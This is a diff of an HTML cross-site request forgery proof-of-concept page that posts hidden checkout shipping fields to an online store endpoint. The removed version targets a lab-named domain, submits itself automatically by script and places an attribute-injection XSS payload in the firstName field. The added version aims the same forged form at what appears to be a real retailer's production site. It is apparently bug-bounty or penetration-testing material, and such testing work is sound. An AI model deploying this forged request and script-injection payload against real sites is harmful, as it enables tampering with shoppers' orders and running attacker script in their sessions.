@@ -1,25 +1,18 @@
 <!DOCTYPE html>
-  <html>
-  <head>
-      <title>CSRF PoC</title>
-  </head>
-  <body>
-      <h3>Standard CSRF PoC</h3>
-      <form action="https://ae.lab-latihan.com/on/demandware.store/Sites-Loccitane_AE-Site/en_AE/CheckoutShippingServices-UpdateShippingMethodsList" method="post">
-      <input type="hidden" name="title" value="Mr" />
-    <input type="hidden" name="firstName" value="kadalfaiz&quot;+onfocus=&quot;print(0)" />
-    <input type="hidden" name="lastName" value="ddfd" />
-    <input type="hidden" name="address1" value="dffdfd" />
-    <input type="hidden" name="address2" value="Dhaid" />
-    <input type="hidden" name="city" value="Dhaid" />
-    <input type="hidden" name="phone" value="544334343" />
-    <input type="hidden" name="phoneCode" value="+971" />
-    <input type="hidden" name="storeID" value="" />
-          <input type="submit" value="Submit request" />
-      </form>
-      <script>
-          history.pushState('', '', '/');
-          document.forms[0].submit();
-      </script>
-  </body>
-  </html>
+<html lang="en">
+	<body>
+		<h1>Form CSRF PoC</h1>
+		<form method="POST" action="https://ae.loccitane.com/on/demandware.store/Sites-Loccitane_AE-Site/en_AE/CheckoutShippingServices-UpdateShippingMethodsList">
+			<input type="hidden" name="title" value="Mr">
+			<input type="hidden" name="firstName" value="kadalfaiz%22+onfocus">
+			<input type="hidden" name="lastName" value="ddfd">
+			<input type="hidden" name="address1" value="dffdfd">
+			<input type="hidden" name="address2" value="Dhaid">
+			<input type="hidden" name="city" value="Dhaid">
+			<input type="hidden" name="phone" value="544334343">
+			<input type="hidden" name="phoneCode" value="+971">
+			<input type="hidden" name="storeID" value="">
+			<input type="submit" value="Submit Request">
+		</form>
+	</body>
+</html>
